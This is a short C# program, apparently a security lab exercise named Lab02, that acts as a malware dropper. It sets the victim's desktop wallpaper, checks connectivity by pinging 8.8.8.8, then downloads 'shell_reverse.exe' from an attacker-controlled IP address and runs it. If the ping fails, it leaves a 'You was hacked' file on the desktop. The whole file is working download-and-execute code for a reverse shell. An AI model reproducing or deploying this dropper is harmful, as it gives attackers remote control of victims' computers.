using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;


namespace Lab02
{
    class Program
    {
        static void Main(string[] args)
        {
            string photo = @"C:\Users\Public\Pictures\Sample Pictures\Lighthouse.jpg"; // picture path
            DisplayPicture(photo);
            InternetChecking();
        }

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool SystemParametersInfo(int uiAction, int uiParam, String pvParam, int fWinIni);

        private const int SPI_SETDESKWALLPAPER = 0x14;
        private const int SPIF_UPDATEINIFILE = 0x1;
        private const int SPIF_SENDWININICHANGE = 0x2;

        // Change Desktop wallpaper
        private static void DisplayPicture(string file_name)
        {
            int flags = 0;
            // Change wallpaper
            // if fail console error
            if (!SystemParametersInfo(SPI_SETDESKWALLPAPER,
                    0, file_name, flags))
            {
                Console.WriteLine("Error");
            }
        }

        // Check Internet connection
        static void InternetChecking()
        {
            // Check internet using ping to Google
            Ping ping = new Ping();
            PingReply reply = ping.Send("8.8.8.8", 2000);

            // specify path save reverse sell file
            string desFolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            if (reply.Status == IPStatus.Success) // iff ping success
            {
                using (var client = new WebClient()) //download reverse shell from attacker
                {
                    try
                    {
                        client.DownloadFile("http://192.168.197.133/shell_reverse.exe", desFolder + "\\shell_reverse.exe");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.StackTrace);
                        return;
                    }
                }

                // run reverse shell after downloaded
                System.Diagnostics.Process.Start(desFolder + "\\shell_reverse.exe");
            }
            else // if don't have Internet
            {
                // Create file
                FileStream stream = new FileStream((desFolder + "\\hacked.txt"), FileMode.OpenOrCreate);
                StreamWriter writer = new StreamWriter(stream);

                // Write file
                writer.Write("You was hacked");

                writer.Close();
                stream.Close();
            }
        }
    }
}
